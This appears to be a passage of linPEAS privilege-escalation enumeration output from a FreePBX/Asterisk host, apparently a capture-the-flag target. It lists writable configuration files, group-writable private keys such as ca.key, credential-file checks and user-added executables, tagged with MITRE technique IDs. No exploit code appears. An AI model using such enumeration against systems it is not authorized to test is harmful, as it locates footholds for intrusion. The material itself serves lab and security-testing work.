+╔══════════╣ Files (scripts) in /etc/profile.d/ (T1546.004)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
+total 100
+drwxr-xr-x.   2 root root 4096 Nov 30  2025 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+-rw-r--r--.   1 root root  771 Apr  1  2020 256term.csh
+-rw-r--r--.   1 root root  841 Apr  1  2020 256term.sh
+-rw-r--r--.   1 root root 1348 Apr  2  2020 abrt-console-notification.sh
+-rw-r--r--.   1 root root  660 Apr  1  2020 bash_completion.sh
+-rw-r--r--.   1 root root  196 Mar 24  2017 colorgrep.csh
+-rw-r--r--.   1 root root  201 Mar 24  2017 colorgrep.sh
+-rw-r--r--.   1 root root 1741 Aug  6  2019 colorls.csh
+-rw-r--r--.   1 root root 1606 Aug  6  2019 colorls.sh
+-rw-r--r--.   1 root root   80 Apr  1  2020 csh.local
+-rw-r--r--.   1 root root 1706 Apr  1  2020 lang.csh
+-rw-r--r--.   1 root root 2703 Apr  1  2020 lang.sh
+-rw-r--r--.   1 root root  123 Jul 30  2015 less.csh
+-rw-r--r--.   1 root root  121 Jul 30  2015 less.sh
+-rwxr-xr-x.   1 root root  787 Nov  2  2023 motd.sh
+-rw-r--r--.   1 root root   81 Apr  1  2020 sh.local
+-rw-r--r--.   1 root root  105 Aug  9  2019 vim.csh
+-rw-r--r--.   1 root root  269 Aug  9  2019 vim.sh
+-rw-r--r--.   1 root root  164 Jan 27  2014 which2.csh
+-rw-r--r--.   1 root root  169 Jan 27  2014 which2.sh
+-rwxr-xr-x.   1 root root 6466 Jun  6  2023 z001-updates.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d (T1543.002)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No
+═╣ Can I read shadow plists? ............ No
+═╣ Can I write shadow plists? ........... No
+═╣ Can I read opasswd file? ............. No
+═╣ Can I write in network-scripts? ...... No
+═╣ Can I read root folder? .............. No
+
+╔══════════╣ Searching root files in home dirs (limit 30) (T1083)
+/home/
+/home/asterisk/user.txt
+/root/
+/var/www
+/var/www/cgi-bin
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100) (T1083)
+-rw-r--r-- 1 root root 19 Nov 30  2025 /var/lib/asterisk/.bashrc
+-rw-r--r-- 1 root root 2671 Nov 26  2025 /etc/asterisk/say.conf
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable (T1083)
+-rw-r----- 1 root asterisk 33 Jun 21 17:50 /home/asterisk/user.txt
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200) (T1574.009,T1574.010)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
+awk: cmd. line:1: (FILENAME=- FNR=901) fatal: print to "standard output" failed (Broken pipe)
+uniq: write error: Broken pipe
+/etc/amportal.conf
+/etc/asterisk
+/etc/asterisk/amd.conf
+/etc/asterisk/ari_additional.conf
+/etc/asterisk/ari_additional_custom.conf
+/etc/asterisk/ari_general_additional.conf
+/etc/asterisk/ari_general_custom.conf
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/asterisk/backup/ari.conf.bk.1698911536
+/etc/asterisk/cdr_adaptive_odbc.conf
+/etc/asterisk/cdr_general_additional.conf
+/etc/asterisk/cdr_general_custom.conf
+/etc/asterisk/cdr_manager.conf
+/etc/asterisk/cdr_non_general_custom.conf
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/asterisk/keys/api_oauth.key
+/etc/asterisk/keys/api_oauth_public.key
+/etc/asterisk/keys/ca.cfg
+/etc/asterisk/keys/ca.crt
+/etc/asterisk/keys/ca.key
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/asterisk/keys/integration/certificate.pem
+/etc/asterisk/keys/integration/webserver.crt
+/etc/asterisk/keys/integration/webserver.key
+/etc/asterisk/keys/.rnd
+/etc/asterisk/localprefixes.conf
+/etc/asterisk/logger_general_additional.conf
+/etc/asterisk/logger_general_custom.conf
+/etc/asterisk/logger_logfiles_additional.conf
+/etc/asterisk/logger_logfiles_custom.conf
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/dahdi
+/etc/dahdi/assigned-spans.conf.sample
+/etc/dahdi/genconf_parameters
+/etc/dahdi/init.conf
+/etc/dahdi/modules
+/etc/dahdi/modules.sample
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/firewall-4.rules
+/etc/firewall-6.rules
+/etc/freepbx.conf
+/etc/freepbx.conf.default
+/etc/modprobe.d/dahdi.conf
+/etc/schmooze
+/etc/schmooze/pbx-brand
+/etc/schmooze/pbx-failsafe
+/etc/schmooze/pbx-version
+/etc/schmooze/system-id
+/etc/wanpipe
+/etc/wanpipe/api
+/etc/wanpipe/api/legacy
+/etc/wanpipe/api/legacy/adccp
+/etc/wanpipe/api/legacy/adccp/adccp_api.c
+/etc/wanpipe/api/legacy/adccp/Makefile
+/etc/wanpipe/api/legacy/aft
+/etc/wanpipe/api/legacy/aft/aft_api.c
+/etc/wanpipe/api/legacy/aft/Makefile
+/etc/wanpipe/api/legacy/aft/README
+/etc/wanpipe/api/legacy/asyhdlc
+/etc/wanpipe/api/legacy/asyhdlc/asyhdlc_api.c
+/etc/wanpipe/api/legacy/asyhdlc/Makefile
+/etc/wanpipe/api/legacy/asyhdlc/README
+/etc/wanpipe/api/legacy/bisync
+/etc/wanpipe/api/legacy/bisync/bsc_api.c
+/etc/wanpipe/api/legacy/bisync/bsc_cmd.c
+/etc/wanpipe/api/legacy/bisync/Makefile
+/etc/wanpipe/api/legacy/bisync/README
+/etc/wanpipe/api/legacy/bisync_strm
+/etc/wanpipe/api/legacy/bisync_strm/bscstrm_api.c
+/etc/wanpipe/api/legacy/bisync_strm/Makefile
+/etc/wanpipe/api/legacy/bisync_strm/README
+/etc/wanpipe/api/legacy/bitstrm
+/etc/wanpipe/api/legacy/bitstrm/bitstrm_api.c
+/etc/wanpipe/api/legacy/bitstrm/bitstrm_switch.c
+/etc/wanpipe/api/legacy/bitstrm/bitstrm_txrx.c
+/etc/wanpipe/api/legacy/bitstrm/datascope
+/etc/wanpipe/api/legacy/bitstrm/datascope/Makefile
+/etc/wanpipe/api/legacy/bitstrm/datascope/ss7_monitor_api.c
+/etc/wanpipe/api/legacy/bitstrm/Makefile
+/etc/wanpipe/api/legacy/bitstrm/te1
+/etc/wanpipe/api/legacy/bitstrm/te1/bstrm_file_client.c
+/etc/wanpipe/api/legacy/bitstrm/te1/bstrm_file_server.c
+/etc/wanpipe/api/legacy/bitstrm/te1/bstrm_gen_file.c
+/etc/wanpipe/api/legacy/bitstrm/te1/Makefile
+/etc/wanpipe/api/legacy/chdlc
+/etc/wanpipe/api/legacy/chdlc/chdlc_api.c
+/etc/wanpipe/api/legacy/chdlc/chdlc_echo.c
+/etc/wanpipe/api/legacy/chdlc/chdlc_integrity.c
+/etc/wanpipe/api/legacy/chdlc/chdlc_rts_cts.c
+/etc/wanpipe/api/legacy/chdlc/Makefile
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/wanpipe/api/legacy/fr
+/etc/wanpipe/api/legacy/fr/fr_api.c
+/etc/wanpipe/api/legacy/fr/Makefile
+/etc/wanpipe/api/legacy/fr/README
+/etc/wanpipe/api/legacy/Makefile
+/etc/wanpipe/api/legacy/mpapi
+/etc/wanpipe/api/legacy/mpapi/linux
+/etc/wanpipe/api/legacy/mpapi/linux/wanpipe_dsp_kernel.h
+/etc/wanpipe/api/legacy/mpapi/linux/wanpipe_lapb_kernel.h
+/etc/wanpipe/api/legacy/mpapi/linux/wanpipe_x25_kernel.h
+/etc/wanpipe/api/legacy/mpapi/x25
+/etc/wanpipe/api/legacy/mpapi/x25/Makefile
+/etc/wanpipe/api/legacy/mpapi/x25/README
+/etc/wanpipe/api/legacy/mpapi/x25/server_v1.c
+/etc/wanpipe/api/legacy/mpapi/x25/server_v2.c
+/etc/wanpipe/api/legacy/mpapi/x25/svc_client.c
+/etc/wanpipe/api/legacy/pos
+/etc/wanpipe/api/legacy/pos/Makefile
+/etc/wanpipe/api/legacy/pos/pos_api.c
+/etc/wanpipe/api/legacy/sdlc
+/etc/wanpipe/api/legacy/sdlc/Makefile
+/etc/wanpipe/api/legacy/sdlc/README
+/etc/wanpipe/api/legacy/sdlc/sdlc_api.c
+/etc/wanpipe/api/legacy/x25
+/etc/wanpipe/api/legacy/x25/hdlc_client.c
+/etc/wanpipe/api/legacy/x25/Makefile
+/etc/wanpipe/api/legacy/x25/pthread
+/etc/wanpipe/api/legacy/x25/pthread/bitmap.c
+/etc/wanpipe/api/legacy/x25/pthread/bitmap.h
+/etc/wanpipe/api/legacy/x25/pthread/Makefile
+/etc/wanpipe/api/legacy/x25/pthread/server.c
+/etc/wanpipe/api/legacy/x25/pthread/server.h
+/etc/wanpipe/api/legacy/x25/pvc_client.c
+/etc/wanpipe/api/legacy/x25/README
+/etc/wanpipe/api/legacy/x25/server_v1.c
+/etc/wanpipe/api/legacy/x25/server_v2.c
+/etc/wanpipe/api/legacy/x25/svc_client.c
+/etc/wanpipe/api/legacy/xdlc
+/etc/wanpipe/api/legacy/xdlc/Makefile
+/etc/wanpipe/api/legacy/xdlc/README
+/etc/wanpipe/api/legacy/xdlc/tx.sh
+/etc/wanpipe/api/legacy/xdlc/xdlc_api.c
+/etc/wanpipe/api/legacy/xdlc/xdlc_mps.c
+/etc/wanpipe/api/lib
+/etc/wanpipe/api/lib/hdlc
+/etc/wanpipe/api/lib/hdlc/Makefile
+/etc/wanpipe/api/lib/hdlc/wanpipe_hdlc.c
+/etc/wanpipe/api/lib/hdlc/wanpipe_hdlc.h
+/etc/wanpipe/api/lib/lib_api.c
+/etc/wanpipe/api/lib/lib_api.h
+/etc/wanpipe/api/libsangoma
+/etc/wanpipe/api/libsangoma/aclocal.m4
+/etc/wanpipe/api/libsangoma/AUTHORS
+/etc/wanpipe/api/libsangoma/autom4te.cache
+/etc/wanpipe/api/libsangoma/autom4te.cache/output.0
+/etc/wanpipe/api/libsangoma/autom4te.cache/output.1
+/etc/wanpipe/api/libsangoma/autom4te.cache/output.2
+/etc/wanpipe/api/libsangoma/autom4te.cache/requests
+/etc/wanpipe/api/libsangoma/autom4te.cache/traces.0
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/wanpipe/api/libsangoma/bootstrap
+/etc/wanpipe/api/libsangoma/build.sh
+/etc/wanpipe/api/libsangoma/ChangeLog
+/etc/wanpipe/api/libsangoma/cleanup.sh
+/etc/wanpipe/api/libsangoma/compile
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/wanpipe/api/libsangoma/.deps/libsangoma_la-libhpsangoma.Plo
+/etc/wanpipe/api/libsangoma/.deps/libsangoma_la-libhpsangoma_priv.Plo
+/etc/wanpipe/api/libsangoma/.deps/libsangoma_la-libsangoma_config.Plo
+/etc/wanpipe/api/libsangoma/.deps/libsangoma_la-libsangoma_hwec.Plo
+/etc/wanpipe/api/libsangoma/.deps/libsangoma_la-libsangoma.Plo
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/wanpipe/api/libsangoma/docs
+/etc/wanpipe/api/libsangoma/docs/doxygen
+/etc/wanpipe/api/libsangoma/examples
+/etc/wanpipe/api/libsangoma/examples/audio_detect
+/etc/wanpipe/api/libsangoma/examples/audio_detect/audio_detect.c
+/etc/wanpipe/api/libsangoma/examples/audio_detect/Makefile
+/etc/wanpipe/api/libsangoma/examples/audio_detect/run_audio_detect.sh
+/etc/wanpipe/api/libsangoma/examples/hdlc_test
+/etc/wanpipe/api/libsangoma/examples/hdlc_test/hdlc
+/etc/wanpipe/api/libsangoma/examples/hdlc_test/hdlc/Makefile
+/etc/wanpipe/api/libsangoma/examples/hdlc_test/hdlc_test.c
+/etc/wanpipe/api/libsangoma/examples/hdlc_test/hdlc/wanpipe_hdlc.c
+/etc/wanpipe/api/libsangoma/examples/hdlc_test/hdlc/wanpipe_hdlc.h
+/etc/wanpipe/api/libsangoma/examples/hdlc_test/Makefile
+/etc/wanpipe/api/libsangoma/examples/hdlc_test/tdm_hdlc_test.sh
+/etc/wanpipe/api/libsangoma/examples/hptdm_api
+/etc/wanpipe/api/libsangoma/examples/hptdm_api/aft_tdm_hp.c
+/etc/wanpipe/api/libsangoma/examples/hptdm_api/aft_tdm_hp.h
+/etc/wanpipe/api/libsangoma/examples/hptdm_api/docs
+/etc/wanpipe/api/libsangoma/examples/hptdm_api/docs/doxygen
+/etc/wanpipe/api/libsangoma/examples/hptdm_api/doxygen.config
+/etc/wanpipe/api/libsangoma/examples/hptdm_api/Makefile
+/etc/wanpipe/api/libsangoma/examples/hptdm_api/rebuild.sh
+/etc/wanpipe/api/libsangoma/examples/priserver
+/etc/wanpipe/api/libsangoma/examples/priserver/librc
+/etc/wanpipe/api/libsangoma/examples/priserver/Makefile
+/etc/wanpipe/api/libsangoma/examples/priserver/priserver.c
+/etc/wanpipe/api/libsangoma/examples/priserver/README
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200) (T1574.009,T1574.010)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
+awk: cmd. line:1: (FILENAME=- FNR=9639) fatal: print to "standard output" failed (Broken pipe)
+grep: write error
+  Group asterisk:
+/etc/asterisk
+/etc/asterisk/sip_nat.conf
+/etc/asterisk/res_fax.conf
+/etc/asterisk/ari_general_additional.conf
+/etc/asterisk/ari_general_custom.conf
+/etc/asterisk/ari_additional.conf
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/asterisk/backup/ari.conf.bk.1698911536
+/etc/asterisk/srtapi_amidefault
+/etc/asterisk/pjsip_notify.conf
+/etc/asterisk/cdr_adaptive_odbc.conf
+/etc/asterisk/pjsip.endpoint.conf
+/etc/asterisk/cdr_general_additional.conf
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/asterisk/keys/.rnd
+/etc/asterisk/keys/integration
+/etc/asterisk/keys/ca.cfg
+/etc/asterisk/keys/ca.key
+/etc/asterisk/keys/ca.crt
+/etc/asterisk/sip_general_additional.conf
+/etc/asterisk/localprefixes.conf
+/etc/asterisk/http_custom.conf
+/etc/asterisk/pjsip.aor_custom_post.conf
+/etc/asterisk/logger_general_additional.conf
+#)You_can_write_even_more_files_inside_last_directory
+
+/etc/freepbx.conf
+/etc/amportal.conf
+/var/lib/php/opcache
+/var/lib/php/session
+/var/lib/php/wsdlcache
+/var/lib/asterisk/sounds
+/var/lib/asterisk/sounds/en
+/var/lib/asterisk/sounds/en/dictate
+/var/lib/asterisk/sounds/en/dictate/both_help.ulaw
+/var/lib/asterisk/sounds/en/dictate/enter_filename.ulaw
+/var/lib/asterisk/sounds/en/dictate/forhelp.ulaw
+/var/lib/asterisk/sounds/en/dictate/pause.ulaw
+/var/lib/asterisk/sounds/en/dictate/paused.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/digits
+/var/lib/asterisk/sounds/en/digits/h-80.ulaw
+/var/lib/asterisk/sounds/en/digits/0.ulaw
+/var/lib/asterisk/sounds/en/digits/mon-4.ulaw
+/var/lib/asterisk/sounds/en/digits/1.ulaw
+/var/lib/asterisk/sounds/en/digits/mon-5.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/followme
+/var/lib/asterisk/sounds/en/followme/call-from.ulaw
+/var/lib/asterisk/sounds/en/followme/no-recording.ulaw
+/var/lib/asterisk/sounds/en/followme/options.ulaw
+/var/lib/asterisk/sounds/en/followme/pls-hold-while-try.ulaw
+/var/lib/asterisk/sounds/en/followme/sorry.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/letters
+/var/lib/asterisk/sounds/en/letters/g.alaw
+/var/lib/asterisk/sounds/en/letters/a.ulaw
+/var/lib/asterisk/sounds/en/letters/y.ulaw
+/var/lib/asterisk/sounds/en/letters/ascii123.ulaw
+/var/lib/asterisk/sounds/en/letters/z.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/phonetic
+/var/lib/asterisk/sounds/en/phonetic/c_p.sln16
+/var/lib/asterisk/sounds/en/phonetic/9_p.ulaw
+/var/lib/asterisk/sounds/en/phonetic/d_p.g722
+/var/lib/asterisk/sounds/en/phonetic/a_p.ulaw
+/var/lib/asterisk/sounds/en/phonetic/d_p.sln16
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/silence
+/var/lib/asterisk/sounds/en/silence/1.ulaw
+/var/lib/asterisk/sounds/en/silence/10.ulaw
+/var/lib/asterisk/sounds/en/silence/2.ulaw
+/var/lib/asterisk/sounds/en/silence/3.ulaw
+/var/lib/asterisk/sounds/en/silence/4.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/conf-invalid.ulaw
+/var/lib/asterisk/sounds/en/enabled.ulaw
+/var/lib/asterisk/sounds/en/CHANGES-asterisk-core-en-1.5
+/var/lib/asterisk/sounds/en/conf-invalidpin.ulaw
+/var/lib/asterisk/sounds/en/for.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/ha/secure.ulaw
+/var/lib/asterisk/sounds/en/ha/ac.ulaw
+/var/lib/asterisk/sounds/en/ha/intruder.ulaw
+/var/lib/asterisk/sounds/en/ha/air-conditioner.ulaw
+/var/lib/asterisk/sounds/en/ha/security-system.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/agent-alreadyon.ulaw
+/var/lib/asterisk/sounds/en/conf-lockednow.ulaw
+/var/lib/asterisk/sounds/en/wx
+/var/lib/asterisk/sounds/en/wx/falling.alaw
+/var/lib/asterisk/sounds/en/wx/around.ulaw
+/var/lib/asterisk/sounds/en/wx/inch.g722
+/var/lib/asterisk/sounds/en/wx/barometer.ulaw
+/var/lib/asterisk/sounds/en/wx/humidity.sln16
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/en/agent-incorrect.ulaw
+/var/lib/asterisk/sounds/en/conf-muted.ulaw
+/var/lib/asterisk/sounds/en/agent-loggedoff.ulaw
+/var/lib/asterisk/sounds/en/confbridge-has-left.ulaw
+/var/lib/asterisk/sounds/en/agent-loginok.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/.asterisk-core-sounds-en-ulaw-1.5
+/var/lib/asterisk/sounds/.asterisk-extra-sounds-en-ulaw-1.5
+/var/lib/asterisk/sounds/.asterisk-core-sounds-en-alaw-1.5
+/var/lib/asterisk/sounds/.asterisk-extra-sounds-en-g722-1.5
+/var/lib/asterisk/sounds/.asterisk-extra-sounds-en-sln16-1.5
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/it/dictate
+/var/lib/asterisk/sounds/it/dictate/both_help.ulaw
+/var/lib/asterisk/sounds/it/dictate/enter_filename.ulaw
+/var/lib/asterisk/sounds/it/dictate/forhelp.ulaw
+/var/lib/asterisk/sounds/it/dictate/pause.ulaw
+/var/lib/asterisk/sounds/it/dictate/paused.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/it/digits
+/var/lib/asterisk/sounds/it/digits/h-14.ulaw
+/var/lib/asterisk/sounds/it/digits/0.ulaw
+/var/lib/asterisk/sounds/it/digits/h-50.ulaw
+/var/lib/asterisk/sounds/it/digits/1.ulaw
+/var/lib/asterisk/sounds/it/digits/h-5.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/it/followme
+/var/lib/asterisk/sounds/it/followme/call-from.ulaw
+/var/lib/asterisk/sounds/it/followme/no-recording.ulaw
+/var/lib/asterisk/sounds/it/followme/options.ulaw
+/var/lib/asterisk/sounds/it/followme/pls-hold-while-try.ulaw
+/var/lib/asterisk/sounds/it/followme/sorry.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/it/letters
+/var/lib/asterisk/sounds/it/letters/a.ulaw
+/var/lib/asterisk/sounds/it/letters/y.ulaw
+/var/lib/asterisk/sounds/it/letters/ascii123.ulaw
+/var/lib/asterisk/sounds/it/letters/z.ulaw
+/var/lib/asterisk/sounds/it/letters/ascii124.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/it/phonetic
+/var/lib/asterisk/sounds/it/phonetic/9_p.ulaw
+/var/lib/asterisk/sounds/it/phonetic/a_p.ulaw
+/var/lib/asterisk/sounds/it/phonetic/b_p.ulaw
+/var/lib/asterisk/sounds/it/phonetic/c_p.ulaw
+/var/lib/asterisk/sounds/it/phonetic/d_p.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/it/silence
+/var/lib/asterisk/sounds/it/silence/1.ulaw
+/var/lib/asterisk/sounds/it/silence/10.ulaw
+/var/lib/asterisk/sounds/it/silence/2.ulaw
+/var/lib/asterisk/sounds/it/silence/3.ulaw
+/var/lib/asterisk/sounds/it/silence/4.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/it/conf-invalidpin.ulaw
+/var/lib/asterisk/sounds/it/dollars.ulaw
+/var/lib/asterisk/sounds/it/CHANGES-asterisk-core-it-1.5
+/var/lib/asterisk/sounds/it/conf-kicked.ulaw
+/var/lib/asterisk/sounds/it/enabled.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/.asterisk-core-sounds-it-ulaw-1.5
+/var/lib/asterisk/sounds/fr
+/var/lib/asterisk/sounds/fr/dictate
+/var/lib/asterisk/sounds/fr/dictate/both_help.ulaw
+/var/lib/asterisk/sounds/fr/dictate/enter_filename.ulaw
+/var/lib/asterisk/sounds/fr/dictate/forhelp.ulaw
+/var/lib/asterisk/sounds/fr/dictate/pause.ulaw
+/var/lib/asterisk/sounds/fr/dictate/paused.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/fr/digits
+/var/lib/asterisk/sounds/fr/digits/h-8.ulaw
+/var/lib/asterisk/sounds/fr/digits/0.ulaw
+/var/lib/asterisk/sounds/fr/digits/h-80.ulaw
+/var/lib/asterisk/sounds/fr/digits/1.ulaw
+/var/lib/asterisk/sounds/fr/digits/h-90.ulaw
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/lib/asterisk/sounds/fr/followme
+/var/lib/asterisk/sounds/fr/followme/call-from.ulaw
+/var/lib/asterisk/sounds/fr/followme/no-recording.ulaw
+/var/lib/asterisk/sounds/fr/followme/options.ulaw
+/var/lib/asterisk/sounds/fr/followme/pls-hold-while-try.ulaw
+/var/lib/asterisk/sounds/fr/followme/sorry.ulaw
+
+
+╔══════════╣ Writable root-owned executables I can modify (max 200) (T1574.009,T1574.010)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
+Writable root-owned executables Not Found
+
+
+
+                            ╔═════════════════════════╗
+════════════════════════════╣ Other Interesting Files ╠════════════════════════════
+                            ╚═════════════════════════╝
+╔══════════╣ .sh files in path (T1574.007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
+/usr/bin/setup-nsssysinit.sh
+/usr/bin/gettext.sh
+/usr/bin/lesspipe.sh
+/usr/bin/jemalloc.sh
+/usr/bin/unix-lpr.sh
+/usr/bin/lprsetup.sh
+/usr/local/bin/pbx-backup.sh
+/usr/sbin/pm-utils-bugreport-info.sh
+
+╔══════════╣ Executable files potentially added by user (limit 70) (T1083)
+2025-11-30+21:32:48.2286058760 /etc/rc.d/init.d/asterisk
+2025-11-30+19:28:58.0445259110 /usr/local/bin/dialplan-exec
+2025-11-30+14:39:29.3282631680 /var/spool/asterisk/cxpanel/main.log
+2025-11-30+14:39:29.1612594700 /var/lib/asterisk/agi-bin/directory
+2025-11-30+14:39:29.1612594700 /var/lib/asterisk/agi-bin/dialparties.agi
+2025-11-30+14:39:29.1612594700 /var/lib/asterisk/agi-bin/checksound.agi
+2025-11-30+14:39:29.1602594480 /var/lib/asterisk/agi-bin/user_login_out.agi
+2025-11-30+14:39:29.1602594480 /var/lib/asterisk/agi-bin/outboundRouteEmail.php
+2025-11-30+14:39:29.1602594480 /var/lib/asterisk/agi-bin/list-item-remove.php
+2025-11-30+14:39:29.1602594480 /var/lib/asterisk/agi-bin/fixlocalprefix
+2025-11-30+14:39:29.1602594480 /var/lib/asterisk/agi-bin/enumlookup.agi
+2025-11-30+14:39:29.1592594260 /var/lib/asterisk/agi-bin/voipinnovations_phpagi.php
+2025-11-30+14:39:29.1582594040 /var/lib/asterisk/agi-bin/voipinnovations_sms.php
+2025-11-30+14:39:29.1582594040 /var/lib/asterisk/agi-bin/enc/vmnotify-newvm.php
+2025-11-30+14:39:29.1582594040 /var/lib/asterisk/agi-bin/enc/vmnotify-main.php
+2025-11-30+14:39:29.1582594040 /var/lib/asterisk/agi-bin/enc/vmnotify-common.php
+2025-11-30+14:39:29.1572593820 /var/lib/asterisk/agi-bin/vmnotify-main.php
+2025-11-30+14:39:29.1572593820 /var/lib/asterisk/agi-bin/vmnotify-common.php
+2025-11-30+14:39:29.1572593820 /var/lib/asterisk/agi-bin/vmnotify-audit.php
+2025-11-30+14:39:29.1572593820 /var/lib/asterisk/agi-bin/enc/vmnotify-audit.php
+2025-11-30+14:39:29.1562593600 /var/lib/asterisk/agi-bin/vmnotify-newvm.php
+2025-11-30+14:39:29.1562593600 /var/lib/asterisk/agi-bin/propolys-tts.agi
+2025-11-30+14:39:29.1552593380 /var/lib/asterisk/agi-bin/update_license.php
+2025-11-30+14:39:29.1552593380 /var/lib/asterisk/agi-bin/LoadLicenseIfExists.php
+2025-11-30+14:39:29.1552593380 /var/lib/asterisk/agi-bin/ddns_client.php
+2025-11-30+14:39:29.1552593380 /var/lib/asterisk/agi-bin/abnormal.php
+2025-11-30+14:39:29.1542593160 /var/lib/asterisk/agi-bin/sipstation_sms.php
+2025-11-30+14:39:29.1532592930 /var/lib/asterisk/agi-bin/vm-greeting-record.php
+2025-11-30+14:39:29.1532592930 /var/lib/asterisk/agi-bin/sangomacrm.agi
+2025-11-30+14:39:29.1532592930 /var/lib/asterisk/agi-bin/recordings.agi
+2025-11-30+14:39:29.1532592930 /var/lib/asterisk/agi-bin/backuprecordings.php
+2025-11-30+14:39:29.1522592710 /var/lib/asterisk/agi-bin/store_recording.php
+2025-11-30+14:39:29.1522592710 /var/lib/asterisk/agi-bin/queue_devstate.agi
+2025-11-30+14:39:29.1522592710 /var/lib/asterisk/agi-bin/mk_clean.agi
+2025-11-30+14:39:29.1522592710 /var/lib/asterisk/agi-bin/minibar.agi
+2025-11-30+14:39:29.1522592710 /var/lib/asterisk/agi-bin/hk.agi
+2025-11-30+14:39:29.1502592270 /var/lib/asterisk/agi-bin/pbxmfa.agi
+2025-11-30+14:39:29.1502592270 /var/lib/asterisk/agi-bin/parkuser.php
+2025-11-30+14:39:29.1502592270 /var/lib/asterisk/agi-bin/parkfetch.agi
+2025-11-30+14:39:29.1502592270 /var/lib/asterisk/agi-bin/pagingpro_call_spooler.agi
+2025-11-30+14:39:29.1502592270 /var/lib/asterisk/agi-bin/page.agi
+2025-11-30+14:39:29.1482591820 /var/lib/asterisk/agi-bin/paging_call_spooler.agi
+2025-11-30+14:39:29.1482591820 /var/lib/asterisk/agi-bin/missedcallnotify.php
+2025-11-30+14:39:29.1462591380 /var/lib/asterisk/agi-bin/wakeup
+2025-11-30+14:39:29.1462591380 /var/lib/asterisk/agi-bin/wakeglobal.php
+2025-11-30+14:39:29.1462591380 /var/lib/asterisk/agi-bin/wakeconfirm.php
+2025-11-30+14:39:29.1452591160 /var/lib/asterisk/agi-bin/fax.agi
+2025-11-30+14:39:29.1452591160 /var/lib/asterisk/agi-bin/enc/fax.agi
+2025-11-30+14:39:29.1442590940 /var/lib/asterisk/agi-bin/directory.lib.php
+2025-11-30+14:39:29.1442590940 /var/lib/asterisk/agi-bin/directory.agi
+2025-11-30+14:39:29.1432590720 /var/lib/asterisk/agi-bin/cos.agi
+2025-11-30+14:39:29.1422590500 /var/lib/asterisk/agi-bin/contactmanager.agi
+2025-11-30+14:39:29.1422590500 /var/lib/asterisk/agi-bin/cidlookup_mysql.agi
+2025-11-30+14:39:29.1412590270 /var/lib/asterisk/agi-bin/calllimit/calllimit.agi
+2025-11-30+14:39:29.1412590270 /var/lib/asterisk/agi-bin/calllimit.agi
+2025-11-30+14:39:29.1412590270 /var/lib/asterisk/agi-bin/callaccounting_hangup.agi
+2025-11-30+14:39:29.1412590270 /var/lib/asterisk/agi-bin/callaccounting_find_ratecard.php
+2025-11-30+14:39:29.1402590050 /var/lib/asterisk/agi-bin/calendar.agi
+2025-11-30+14:39:29.1402590050 /var/lib/asterisk/agi-bin/broadcast_manage.php
+2025-11-30+14:39:29.1402590050 /var/lib/asterisk/agi-bin/broadcast_log.php
+2025-11-30+14:39:29.1392589830 /var/lib/asterisk/agi-bin/areminder-manager.php
+2025-11-30+14:39:29.1392589830 /var/lib/asterisk/agi-bin/areminder-main.php
+2025-11-30+14:39:29.1392589830 /var/lib/asterisk/agi-bin/areminder/areminder-manager.php
+2025-11-30+14:39:29.1392589830 /var/lib/asterisk/agi-bin/areminder/areminder-main.php
+2025-11-30+14:39:29.1382589610 /var/lib/asterisk/agi-bin/allowlist-check.agi
